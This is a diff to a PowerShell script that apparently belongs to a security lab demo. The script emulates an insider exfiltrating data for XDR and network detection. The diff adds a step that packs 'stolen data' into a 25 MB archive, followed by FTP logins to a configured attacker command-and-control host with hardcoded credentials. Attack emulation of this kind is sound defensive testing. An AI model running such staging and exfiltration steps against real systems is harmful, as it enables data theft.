@@ -12,10 +12,15 @@
 param([switch]$DryRun)
 . "$PSScriptRoot\..\config\lab-config.ps1"
 . "$PSScriptRoot\_net.ps1"
+. "$PSScriptRoot\_endpoint.ps1"
 $cfg = $Global:EalDemo
 if ($DryRun) { $cfg.DryRun = $true }
 
-Write-Stage "STAGE 2 (MIDDLE): opening exfil FTP channel to $($cfg.AttackerC2) as '$($cfg.FtpUser)'" "INFO"
+# --- XDR endpoint layer: the insider stages data into an archive -----------
+Write-Stage "STAGE 2a (XDR/endpoint): staging stolen data into an archive" "INFO"
+New-StagingArchive -Megabytes 25
+
+Write-Stage "STAGE 2b (EAL/network): opening exfil FTP channel to $($cfg.AttackerC2) as '$($cfg.FtpUser)'" "INFO"
 Invoke-Ftp -Server $cfg.AttackerC2 -User $cfg.FtpUser        -Pass "Leaver#2026"  -Label "rare FTP user"
 Invoke-Ftp -Server $cfg.AttackerC2 -User "anonymous"          -Pass "x@x.com"     -Label "new FTP server probe"
 Invoke-Ftp -Server $cfg.AttackerC2 -User "$($cfg.FtpUser)_bak" -Pass "Leaver#2026" -Label "rare FTP user 2"
